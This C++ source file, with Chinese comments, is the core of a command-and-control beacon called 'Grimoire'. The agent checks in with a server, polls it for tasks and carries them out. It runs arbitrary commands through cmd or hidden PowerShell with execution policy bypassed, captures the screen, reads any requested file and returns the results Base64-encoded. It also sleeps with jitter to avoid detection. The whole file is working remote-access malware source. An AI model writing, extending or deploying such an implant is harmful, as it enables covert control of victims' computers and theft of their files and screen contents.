//
// Created by Nebu1ea on 2025/11/25.
//


#define STB_IMAGE_WRITE_IMPLEMENTATION


#include "stb_image_write.h"
#include "GrimoireAgent.hpp"
#include "GrimoireConfig.hpp"
#include "Utils.hpp"
#include <iostream>
#include <random>
#include <thread>
#include <fstream>
// 引入特定平台的头文件，用于命令执行和截屏（Windows API）
#ifdef _WIN32
#include <windows.h>
#include <cstdio>
#else
// Linux/macOS 占位符
#include <cstdlib>
#endif


namespace Grimoire::Agent {

// ----------------------------------------------------
// 构造函数
// ----------------------------------------------------
GrimoireAgent::GrimoireAgent() {
    // 初始化加密模块：它是所有共享状态的管理者
    crypto_manager_ = std::make_shared<GrimoireCrypto>();

    // 初始化通信模块：依赖于加密模块
    comms_manager_ = std::make_unique<GrimoireComms>(crypto_manager_);
}



// 专门处理下载的逻辑
std::string GrimoireAgent::HandleDownload(const std::string& filePath) {
    // 以二进制模式打开文件

    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        std::string errorMsg = "ERROR: Cannot open file " + filePath;

        std::vector<unsigned char> failMessage(
            errorMsg.begin(), errorMsg.end()
        );
        return Utils::Base64Encode(failMessage);
    }

    // 将整个文件读入 buffer
    std::vector<unsigned char> buffer(
        (std::istreambuf_iterator<char>(file)),
        (std::istreambuf_iterator<char>())
    );
    file.close();

    // 将二进制 buffer 转为 Base64 字符串
    return Utils::Base64Encode(buffer);
}

// ----------------------------------------------------
// 任务处理：命令执行 (Command Execution)这是最不隐蔽的方式，非常的西巴，掩蔽的方式以后实现
// ----------------------------------------------------
std::string GrimoireAgent::ExecuteCommand(const std::string& command, const std::string& shellType) {
    std::string finalCommand;

    #ifdef _WIN32
        if (shellType == "powershell")
        {
            // 使用 -EncodedCommand 可以直接接收 Unicode Base64 字符串
            // 这样可以完美避开所有特殊字符转义问题
            finalCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + command;
        }else {
            // CMD 依然保持原样，直接执行
            finalCommand = "cmd.exe /c " + command;
        }
    #else
        // Linux 下保持简单
        finalCommand = command;
    #endif

        std::string result = "";
        char buffer[128];

        // 加上 2>&1 捕获错误，确保“查无此命令”也能返回给前端
        std::string redirectCmd = finalCommand + " 2>&1";

    #ifdef _WIN32
        FILE* pipe = _popen(redirectCmd.c_str(), "r");
    #else
        FILE* pipe = popen(redirectCmd.c_str(), "r");
    #endif

        if (!pipe) return "ERROR: Failed to open pipe.";

        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }

    #ifdef _WIN32
        _pclose(pipe);
    #else
        pclose(pipe);
    #endif

    return result;
}

// ----------------------------------------------------
// 任务处理：截屏 (Screenshot) 及其不隐蔽，掩蔽的太难写了，要调用DXGI
// ----------------------------------------------------
std::string GrimoireAgent::TakeScreenshot() {
    #ifdef _WIN32
        // 获取屏幕设备上下文 (DC)
        SetProcessDPIAware();
        HWND hDesktop = GetDesktopWindow();
        HDC hScreen = GetDC(hDesktop);
        HDC hDC = CreateCompatibleDC(hScreen);

        if (!hScreen || !hDC) {
            if (hScreen) ReleaseDC(hDesktop, hScreen);
            return "";
        }

        // 获取屏幕尺寸
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);

        // 创建兼容位图
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
        if (!hBitmap) {
            DeleteDC(hDC);
            ReleaseDC(hDesktop, hScreen);
            return "";
        }

        // 将位图选入设备上下文
        HGDIOBJ hOld = SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

        // 准备像素数据容器
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = width;
        bmi.bmiHeader.biHeight = -height; // Top-Down
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        std::vector<unsigned char> buffer(width * height * 4);
        GetDIBits(hDC, hBitmap, 0, height, buffer.data(), &bmi, DIB_RGB_COLORS);

        // 清理 GDI 资源
        SelectObject(hDC, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(hDesktop, hScreen);

        // 颜色转换 (BGRA -> RGBA)
        for (size_t i = 0; i < buffer.size(); i += 4) {
            std::swap(buffer[i], buffer[i + 2]);
        }

        std::vector<unsigned char> jpgData;
        stbi_write_jpg_to_func(
        [](void* context, void* data, int size) {
            auto& vec = *static_cast<std::vector<unsigned char>*>(context);
            vec.insert(vec.end(), (unsigned char*)data, (unsigned char*)data + size);
            },
            &jpgData,
            width,       // 屏幕宽
            height,      // 屏幕高
            4,           // 像素通道数 (RGBA 选 4)
            buffer.data(), // GetDIBits 拿到的原始数据
            40
        );
        return Utils::Base64Encode(jpgData);
    #endif
}




// ----------------------------------------------------
// 任务分发器 (Task Dispatcher)
// ----------------------------------------------------
std::vector<unsigned char> GrimoireAgent::ProcessTask(const std::vector<unsigned char>& task_payload) {
    try {
        // 将接收到的字节数组转换为 JSON
        std::string task_str(task_payload.begin(), task_payload.end());
        json task_json = json::parse(task_str);

        // 检查必须字段
        if (!task_json.contains("task_id") || !task_json.contains("command")) {
            return {}; // 忽略无效任务
        }

        std::string task_id = task_json["task_id"].get<std::string>();
        std::string command_type = task_json["command"].get<std::string>();

        // 提取可选参数 argument，如果不存在则为空字符串
        std::string argument = task_json.contains("arguments")
                               ? task_json["arguments"].get<std::string>()
                               : "";

        std::string result_str;
        std::vector<unsigned char> result_bytes;

        std::cout << "INFO: Executing task " << task_id << " (Type: " << command_type << ")..." << std::endl;

        // 2. 任务分发 (Dispatch based on command_type)
        if (command_type == "shell" || command_type == "whoami" || command_type == "powershell") {
            // shell 任务的参数就是 argument
            std::string cmd_to_run =  argument;

            if (cmd_to_run.empty()) {
                 result_str = "ERROR: Shell command task requires an argument.";
            } else {
                 result_str = ExecuteCommand(cmd_to_run, command_type); // 使用 ExecuteCommand 执行
            }
            result_bytes.assign(result_str.begin(), result_str.end());

        }else if (command_type == "screenshot") {
            // 截屏任务，可以忽略 argument 或用于指定格式/显示器
            result_str = TakeScreenshot();
            result_bytes.assign(result_str.begin(), result_str.end());

        }else if (command_type == "download") {
            result_str = HandleDownload(argument);
            result_bytes.assign(result_str.begin(), result_str.end());
        }

        else if (command_type == "sleep") {
            // 运行时修改休眠时间（后续我会补充）
            result_str = "INFO: Sleep time update task received.";
            result_bytes.assign(result_str.begin(), result_str.end());

        } else {
            result_str = "ERROR: Unknown command type: " + command_type;
            result_bytes.assign(result_str.begin(), result_str.end());
        }

        // 封装结果 JSON (与之前相同)
        json result_json = {
            {"task_id", task_id},
            {"output", Utils::Base64Encode(result_bytes)}
        };
        std::string final_result = result_json.dump();
        return std::vector<unsigned char>(final_result.begin(), final_result.end());

    } catch (const std::exception& e) {
        std::cerr << "ERROR: Failed to process task: " << e.what() << std::endl;
        return {};
    }
}


// ----------------------------------------------------
// 休眠与抖动 (Sleep/Jitter)
// ----------------------------------------------------
void GrimoireAgent::SleepWithJitter() {
    // 计算抖动范围
    int jitter_range = (SLEEP_TIME_SECONDS * JITTER_PERCENT) / 100;

    // 使用 libsodium 替代 C++ 随机数库，提供更高的随机性
    // 抖动时间 = 0 到 2*jitter_range 之间的一个随机值 - jitter_range
    uint32_t random_jitter = 0;
    randombytes_buf(&random_jitter, sizeof(random_jitter));

    int min_sleep = SLEEP_TIME_SECONDS - jitter_range;
    int max_sleep = SLEEP_TIME_SECONDS + jitter_range;

    // 确保最小休眠时间不小于 1 秒
    if (min_sleep < 1) min_sleep = 1;

    // 随机数范围 [min_sleep, max_sleep]
    int sleep_duration = min_sleep + (random_jitter % (max_sleep - min_sleep + 1));

    std::cout << "INFO: Sleeping for " << sleep_duration << " seconds..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(sleep_duration));
}


// ----------------------------------------------------
// 主循环 (Run)
// ----------------------------------------------------
void GrimoireAgent::Run() {

    std::cout << "INFO: Grimoire Beacon starting up..." << std::endl;

    // 密钥协商 (Initial Check-in)
    while (!comms_manager_->SendInitialCheckIn()) {
        std::cerr << "CRITICAL: Initial check-in failed. Retrying in " << SLEEP_TIME_SECONDS << "s." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(SLEEP_TIME_SECONDS));
    }
    std::cout << "SUCCESS: Session established. Beacon ID (SF): " << crypto_manager_->GetBeaconSessionFingerprint() << std::endl;


    // 主通信循环
    while (true) {

        // 请求任务
        std::vector<unsigned char> task_payload = comms_manager_->ReceiveTask();

        std::vector<unsigned char> result_payload;

        if (!task_payload.empty()) {
            std::cout << "<DEBUG> Task:      " << task_payload.data() << std::endl;
            // 处理任务
            result_payload = ProcessTask(task_payload);

        }


        // 发送结果 (如果 result_payload 非空，则发送任务结果；否则发送心跳)
        if (!result_payload.empty()) {
            std::cout << "<DEBUG>  Result:     " << result_payload.data() << std::endl;
             comms_manager_->SendResult(result_payload);
        }

        //  休眠与抖动
        SleepWithJitter();
    }
}

} // namespace Grimoire